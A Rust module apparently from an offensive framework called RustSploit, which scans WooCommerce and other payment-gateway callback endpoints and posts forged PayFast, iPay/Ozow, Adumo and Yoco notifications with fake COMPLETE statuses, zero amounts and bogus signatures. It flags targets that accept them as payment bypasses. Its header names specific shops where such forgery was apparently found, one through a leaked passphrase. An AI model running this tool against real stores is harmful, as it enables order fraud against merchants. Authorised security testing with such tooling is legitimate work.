//! Payment Gateway Callback Fuzzer
//!
//! Tests WooCommerce / custom payment gateway callback endpoints for
//! forgery vulnerabilities. Sends crafted IPN / webhook payloads to
//! common gateway callback URLs and reports endpoints that respond
//! positively to unsigned or malformed callbacks.
//!
//! Based on findings from rebelspizza (PayFast IPN forgery with leaked
//! passphrase), vaperite (iPay/Ozow, Adumo, Payflex, Breaze gateways),
//! herbshack (Yoco), and tasteofcannabis (PayFast).

use anyhow::{Context, Result};
use colored::*;
use std::time::Duration;

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::{build_http_client, cfg_prompt_default, cfg_prompt_yes_no, is_batch_mode};

/// Gateway callback paths to probe.
const GATEWAY_PATHS: &[(&str, &str)] = &[
    // WooCommerce gateway callbacks
    ("PayFast", "/?wc-api=WC_Gateway_PayFast"),
    ("PayFast (alt)", "/?wc-api=payfast"),
    ("iPay / Ozow", "/?wc-api=WC_Gateway_iPay"),
    ("iPay / Ozow (alt)", "/?wc-api=wc_gateway_ipay"),
    ("Ozow", "/?wc-api=ozow"),
    ("Adumo", "/?wc-api=adumoonline"),
    ("Payflex", "/?wc-api=payflex"),
    ("BACS", "/?wc-api=bacs"),
    ("Breaze", "/?wc-api=breaze"),
    ("Breaze (alt)", "/?wc-api=WC_Breaze"),
    ("Yoco", "/?wc-api=yoco"),
    ("Yoco (webhook)", "/wp-json/yoco/webhook"),
    ("PayPal Buttons", "/wp-json/paypal-buttons/create-order"),
    ("PayPal Webhooks", "/wp-json/wc/v3/paypal-webhooks"),
    ("Stripe Webhook", "/?wc-api=wc_gateway_stripe"),
    ("Stripe (alt)", "/wp-json/wc/v3/webhooks"),
    // Common non-WooCommerce IPN endpoints
    ("Generic IPN", "/payfast"),
    ("Generic IPN (alt)", "/ipn"),
    ("Generic Webhook", "/webhook"),
    ("Generic Callback", "/callback"),
    ("Generic Notify", "/notify"),
    ("Generic Return", "/return"),
    // Gateway REST endpoints
    ("Payment Gateways", "/wp-json/wc/v3/payment_gateways"),
];

/// Forged callback payloads mimicking various gateway formats.
const FORGED_PAYLOADS: &[(&str, &str, &[(&str, &str)])] = &[
    // PayFast ITN format (rebelspizza pattern)
    (
        "PayFast ITN (forged COMPLETE)",
        "application/x-www-form-urlencoded",
        &[
            ("m_payment_id", "99999"),
            ("pf_payment_id", "TEST99999"),
            ("payment_status", "COMPLETE"),
            ("amount_gross", "0.00"),
            ("amount_fee", "-0.00"),
            ("amount_net", "0.00"),
            ("item_name", "Test Order"),
            ("item_description", "Test"),
            ("email_address", "test@example.com"),
            ("name_first", "Test"),
            ("name_last", "User"),
            ("merchant_id", "10000000"),
            ("signature", "forged"),
        ],
    ),
    // iPay / Ozow format
    (
        "iPay/Ozow (forged notify)",
        "application/x-www-form-urlencoded",
        &[
            ("Hash", "00000000000000000000000000000000"),
            ("IsTest", "true"),
            ("HashCheck", "00000000000000000000000000000000"),
            ("OrderNumber", "99999"),
            ("Amount", "0.00"),
            ("TransactionReference", "TEST99999"),
            ("ResultCode", "0"),
            ("ResultDescription", "APPROVED"),
            ("PaymentMethod", "eft"),
            ("Customer", "test@example.com"),
        ],
    ),
    // Adumo JWT-style webhook (forged)
    ("Adumo (forged JWT webhook)", "application/json", &[]),
    // Yoco webhook format
    ("Yoco (forged webhook)", "application/json", &[]),
];

fn banner() {
    if is_batch_mode() {
        return;
    }
    crate::mprintln!(
        "{}",
        "╔══════════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Payment Gateway Callback Fuzzer                            ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Tests IPN/webhook endpoints for forged-callback acceptance ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚══════════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "Payment Gateway Callback Fuzzer".to_string(),
        description: "Probes WooCommerce and custom payment gateway callback/IPN/webhook \
                      endpoints with forged payloads to detect misconfigured or unsigned \
                      callback handlers. Tests PayFast, iPay/Ozow, Adumo, Payflex, Yoco, \
                      Breaze, Stripe, and PayPal endpoints. Based on rebelspizza PayFast \
                      IPN forgery and vaperite multi-gateway findings."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://github.com/PayFast/plugin-woocommerce".to_string(),
            "https://developer.payfast.co.za/docs".to_string(),
            "https://developer.yoco.com".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Good,
        default_port: None,
    }
}

fn url_with_scheme(t: &str) -> String {
    if t.starts_with("http://") || t.starts_with("https://") {
        t.to_string()
    } else {
        format!("https://{}", t.trim_end_matches('/'))
    }
}

/// Build a JSON body for Adumo-style webhooks.
fn adumo_json_body() -> String {
    r#"{"event":"payment.complete","data":{"orderId":"99999","amount":0,"currency":"ZAR","transactionId":"TEST99999","status":"COMPLETE"},"signature":"forged"}"#.to_string()
}

/// Build a JSON body for Yoco-style webhooks.
fn yoco_json_body() -> String {
    r#"{"type":"payment.succeeded","payload":{"checkoutId":"test_99999","orderId":"99999","amount":0,"currency":"ZAR","status":"succeeded"},"signature":"forged"}"#.to_string()
}

/// Classify response as interesting (warrants manual review).
fn classify_response(status: u16, body: &str) -> Option<(&'static str, &'static str)> {
    let body_lower = body.to_lowercase();

    // Positive indicators — gateway accepted the callback
    if body.contains("payment complete")
        || body.contains("order paid")
        || body.contains("success\":true")
        || body.contains("success\": true")
        || body.contains("resultcode")
        || body.contains("payment_status")
        || body.contains("approved")
    {
        return Some((
            "CRITICAL",
            "accepts forged callback — payment bypass likely",
        ));
    }

    // Suspicious — handler exists and processes, but rejects
    if body.contains("-1")
        || body.contains("\"result\":-1")
        || body.contains("invalid")
        || body.contains("failed")
        || body_lower.contains("signature")
        || body_lower.contains("hash")
    {
        return Some((
            "INFO",
            "handler registered and active — signature validation present",
        ));
    }

    // HTTP-level indicators
    if status == 200 && (body.len() > 10 && body.len() < 500) {
        return Some(("LOW", "handler returned non-trivial response — investigate"));
    }

    if status == 500 {
        return Some((
            "LOW",
            "handler exists but crashes on forged input (possible DoS)",
        ));
    }

    if status == 302 || status == 301 {
        return Some(("LOW", "redirect response — may indicate SSO/auth flow"));
    }

    None
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("payment_gateway_fuzzer requires a single-host target")?;
    banner();

    let mut outcome = ModuleOutcome::ok();
    let base = cfg_prompt_default("url", "Target base URL", &url_with_scheme(target)).await?;
    let base = base.trim_end_matches('/').to_string();
    let fuzz_payloads =
        cfg_prompt_yes_no("fuzz_payloads", "Send forged IPN/webhook payloads?", true).await?;
    let timeout_secs: u64 = ctx.options.get_or("timeout", 10u64);

    let client = build_http_client(Duration::from_secs(timeout_secs))?;

    crate::mprintln!("{}", format!("[*] Target: {}", base).cyan());
    crate::mprintln!(
        "{}",
        format!(
            "[*] Probing {} gateway callback paths...",
            GATEWAY_PATHS.len()
        )
        .cyan()
    );
    crate::mprintln!();

    let mut hits: Vec<(String, String, String, String)> = Vec::new();

    // Phase 1: Probe every gateway path with a benign GET + POST
    for (gateway_name, path) in GATEWAY_PATHS {
        ctx.rate_limit(target).await;
        let full_url = format!("{}{}", base, path);

        // GET baseline
        let get_result = client.get(&full_url).send().await;
        let (get_status, get_body) = match get_result {
            Ok(resp) => {
                let s = resp.status().as_u16();
                let b = crate::utils::network::read_http_body_text_capped(
                    resp,
                    crate::utils::safe_io::DEFAULT_BODY_CAP,
                )
                .await
                .unwrap_or_default();
                (s, b)
            }
            Err(e) => {
                tracing::debug!("gateway request: {e:#}");
                crate::mprintln!(
                    "{}",
                    format!("  [-] {} {} (unreachable)", gateway_name, path).dimmed()
                );
                continue;
            }
        };

        let get_class = classify_response(get_status, &get_body);
        // POST baseline (empty)
        ctx.rate_limit(target).await;
        let post_result = client
            .post(&full_url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send()
            .await;
        let post_class = match post_result {
            Ok(resp) => {
                let s = resp.status().as_u16();
                let b = crate::utils::network::read_http_body_text_capped(
                    resp,
                    crate::utils::safe_io::DEFAULT_BODY_CAP,
                )
                .await
                .unwrap_or_default();
                classify_response(s, &b)
            }
            Err(e) => {
                tracing::debug!("POST request: {e:#}");
                None
            }
        };

        let best_class = match (get_class, post_class) {
            (Some((sev, msg)), _) if sev == "CRITICAL" => Some((sev, msg)),
            (_, Some((sev, msg))) if sev == "CRITICAL" => Some((sev, msg)),
            (Some(g), Some(p)) => {
                let g_prio = match g.0 {
                    "CRITICAL" => 4,
                    "INFO" => 3,
                    "LOW" => 2,
                    _ => 1,
                };
                let p_prio = match p.0 {
                    "CRITICAL" => 4,
                    "INFO" => 3,
                    "LOW" => 2,
                    _ => 1,
                };
                if g_prio >= p_prio { Some(g) } else { Some(p) }
            }
            (Some(g), None) => Some(g),
            (None, Some(p)) => Some(p),
            (None, None) => None,
        };

        if let Some((severity, msg)) = best_class {
            let colored_sev = match severity {
                "CRITICAL" => severity.red().bold().to_string(),
                "INFO" => severity.cyan().to_string(),
                _ => severity.yellow().to_string(),
            };
            crate::mprintln!(
                "[{}] {} {} -> status={}  {}",
                colored_sev,
                gateway_name,
                path,
                get_status,
                msg.dimmed()
            );
            hits.push((
                gateway_name.to_string(),
                path.to_string(),
                severity.to_string(),
                msg.to_string(),
            ));
        } else if get_status < 400 {
            crate::mprintln!(
                "{}",
                format!(
                    "  [--] {} {} status={} (no callback signal)",
                    gateway_name, path, get_status
                )
                .dimmed()
            );
        }
    }

    // Phase 2: Send forged payloads to confirmed-active endpoints
    if fuzz_payloads && !hits.is_empty() {
        crate::mprintln!();
        crate::mprintln!(
            "{}",
            "[*] Phase 2: Sending forged IPN/webhook payloads...".bold()
        );

        let active_paths: Vec<String> = hits.iter().map(|(_, p, _, _)| p.clone()).collect();

        for (payload_name, content_type, fields) in FORGED_PAYLOADS {
            for path in &active_paths {
                ctx.rate_limit(target).await;
                let full_url = format!("{}{}", base, path);

                let result = if *content_type == "application/json" {
                    let body = match *payload_name {
                        n if n.contains("Adumo") => adumo_json_body(),
                        n if n.contains("Yoco") => yoco_json_body(),
                        _ => String::new(),
                    };
                    if body.is_empty() {
                        continue;
                    }
                    client
                        .post(&full_url)
                        .header("Content-Type", *content_type)
                        .body(body)
                        .send()
                        .await
                } else {
                    let form: String = fields
                        .iter()
                        .map(|(k, v)| format!("{}={}", k, v))
                        .collect::<Vec<_>>()
                        .join("&");
                    client
                        .post(&full_url)
                        .header("Content-Type", *content_type)
                        .body(form)
                        .send()
                        .await
                };

                match result {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        let body = crate::utils::network::read_http_body_text_capped(
                            resp,
                            crate::utils::safe_io::DEFAULT_BODY_CAP,
                        )
                        .await
                        .unwrap_or_default();
                        if let Some((severity, msg)) = classify_response(status, &body) {
                            let colored_sev = match severity {
                                "CRITICAL" => severity.red().bold().to_string(),
                                "INFO" => severity.cyan().to_string(),
                                _ => severity.yellow().to_string(),
                            };
                            crate::mprintln!(
                                "[{}] {} @ {} -> status={}  {}",
                                colored_sev,
                                payload_name,
                                path,
                                status,
                                msg.dimmed()
                            );
                            hits.push((
                                format!("{} @ {}", payload_name, path),
                                path.to_string(),
                                severity.to_string(),
                                msg.to_string(),
                            ));
                        } else {
                            crate::mprintln!(
                                "{}",
                                format!(
                                    "  [--] {} @ {} status={} (rejected)",
                                    payload_name, path, status
                                )
                                .dimmed()
                            );
                        }
                    }
                    Err(e) => {
                        tracing::debug!("Forged payload probe failed: {e}");
                    }
                }
            }
        }
    }

    // Summary and findings
    crate::mprintln!();
    crate::mprintln!("{}", "=== Payment Gateway Fuzz Results ===".bold());
    crate::mprintln!("  Target: {}", base);
    if hits.is_empty() {
        crate::mprintln!(
            "  {}",
            "No active payment gateway callbacks detected.".green()
        );
    } else {
        let critical = hits.iter().filter(|(_, _, s, _)| s == "CRITICAL").count();
        let info_count = hits.iter().filter(|(_, _, s, _)| s == "INFO").count();
        crate::mprintln!(
            "{}",
            format!(
                "  {} findings: {} CRITICAL, {} INFO, {} LOW",
                hits.len(),
                critical,
                info_count,
                hits.len() - critical - info_count
            )
            .yellow()
        );

        for (name, path, severity, msg) in &hits {
            let kind = if severity == "CRITICAL" {
                FindingKind::Vulnerable
            } else {
                FindingKind::Note
            };
            outcome.findings.push(Finding {
                target: target.to_string(),
                kind,
                message: format!("Payment gateway '{}' at {}{}: {}", name, base, path, msg),
                data: Some(serde_json::json!({
                    "gateway": name,
                    "path": path,
                    "severity": severity,
                    "detail": msg,
                })),
            });
        }
    }

    crate::mprintln!();
    crate::mprintln!(
        "{}",
        "[*] Note: False negatives possible. Manual review of active endpoints recommended."
            .yellow()
    );
    crate::mprintln!(
        "{}",
        "[*] For PayFast: test signature generation with known passphrase.".dimmed()
    );

    Ok(outcome)
}

crate::register_native_module!(
    crate::module::Category::Scanners,
    "payment_gateway_fuzzer",
    native
);
